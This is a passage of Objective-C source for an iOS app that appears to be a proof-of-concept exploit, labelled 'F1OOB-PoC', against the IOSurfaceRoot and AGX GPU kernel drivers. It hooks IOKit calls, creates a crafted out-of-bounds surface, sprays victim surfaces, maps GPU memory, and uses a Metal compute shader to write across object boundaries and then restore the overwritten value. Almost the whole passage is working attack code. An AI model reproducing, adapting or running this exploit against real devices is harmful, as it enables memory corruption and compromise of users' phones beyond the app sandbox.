            [oe2 setComputePipelineState:pwr64];
            [oe2 setBuffer:f1buf offset:0 atIndex:0];
            [oe2 setBytes:&d length:8 atIndex:1];
            [oe2 setBytes:&orig length:8 atIndex:2];
            [oe2 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [oe2 endEncoding];
            [ob2 commit];
            [ob2 waitUntilCompleted];
            L(@"[HIGHVA-W] restore status=%lu err=%@", (unsigned long)ob2.status, ob2.error);
        }
    }

    L(@"[METAL] done");
}

static void run(void) {
    g_orig_iccm = (void *)dlsym(RTLD_NEXT, "IOConnectCallMethod");
    g_orig_iccm_a = (void *)dlsym(RTLD_NEXT, "IOConnectCallAsyncMethod");
    g_orig_iccs = (void *)dlsym(RTLD_NEXT, "IOConnectCallStructMethod");
    g_orig_iccs2 = g_orig_iccm;
    g_orig_match = (void *)dlsym(RTLD_NEXT, "IOServiceMatching");
    g_orig_open = (void *)dlsym(RTLD_NEXT, "IOServiceOpen");
    { char _p[512]; snprintf(_p,sizeof(_p),"%s/Documents/ip.log",getenv("HOME")?:"."); unlink(_p); }
    struct utsname un;
    uname(&un);
    L(@"=== F1OOB-PoC start ===");
    L(@"device=%s version=%s", un.machine, un.version);
    service_probe();
    commapi_probe();

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[F1] no IOSurfaceRoot"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"[F1] IOSurfaceRoot open=0x%x conn=0x%x", kr, conn);
    if (kr != KERN_SUCCESS) return;

    uint32_t ctrl_sid = create_surface(conn, normal_xml(), "CTRL");
    uint32_t sid = create_surface(conn, f1_xml(), "F1");
    if (!sid) { L(@"[F1] F1 surface rejected"); IOServiceClose(conn); return; }

    IOSurfaceRef surf = IOSurfaceLookup(sid);
    if (!surf) { L(@"[F1] IOSurfaceLookup(%u) failed", sid); IOServiceClose(conn); return; }
    void *base = IOSurfaceGetBaseAddress(surf);
    size_t alloc = IOSurfaceGetAllocSize(surf);
    L(@"[F1] id=%u base=%p alloc=0x%zx planes=%zu",
      sid, base, alloc, IOSurfaceGetPlaneCount(surf));
    if (base) {
        size_t planes = IOSurfaceGetPlaneCount(surf);
        for (size_t i = 0; i < planes && i < 4; i++) {
            void *pb = IOSurfaceGetBaseAddressOfPlane(surf, i);
            L(@"[F1] plane[%zu] base=%p bpr=%zu h=%zu", i, pb,
              IOSurfaceGetBytesPerRowOfPlane(surf, i),
              IOSurfaceGetHeightOfPlane(surf, i));
        }
    }

    accel_probe(IOSurfaceLookup(ctrl_sid), surf);

    IOSurfaceRef ios_victims[32];
    int ivc = create_iosurface_victims(ios_victims, 32);

    uint64_t agx_span = 0;
    io_connect_t agx_conn = 0;
    uint64_t agx_va = agx_map(sid, &agx_span, &agx_conn);

    metal_cross_object_write(surf, agx_va, agx_span);

    if (agx_conn) IOServiceClose(agx_conn);
    for (int i = 0; i < ivc; i++) CFRelease(ios_victims[i]);
    CFRelease(surf);
    (void)ctrl_sid;
    IOServiceClose(conn);
    L(@"=== F1OOB-PoC done ===");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    gLog = [NSMutableString new];
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    gDir = [docs stringByAppendingPathComponent:@"F1OOB-PoC"];
    [[NSFileManager defaultManager] createDirectoryAtPath:gDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    NSDateFormatter *df = [NSDateFormatter new];
    df.dateFormat = @"yyyyMMdd-HHmmss";
    gLogPath = [gDir stringByAppendingPathComponent:
                [NSString stringWithFormat:@"run-%@.log", [df stringFromDate:[NSDate date]]]];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"]
            atomically:YES encoding:NSUTF8StringEncoding error:nil];

    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    self.tv = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.tv.editable = NO;
    self.tv.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    [vc.view addSubview:self.tv];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            @autoreleasepool { run(); }
            dispatch_async(dispatch_get_main_queue(), ^{
                pthread_mutex_lock(&gLock);
                self.tv.text = [gLog copy];
                pthread_mutex_unlock(&gLock);
            });
        });
    });
    return YES;
}
@end

int main(int argc, char **argv) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
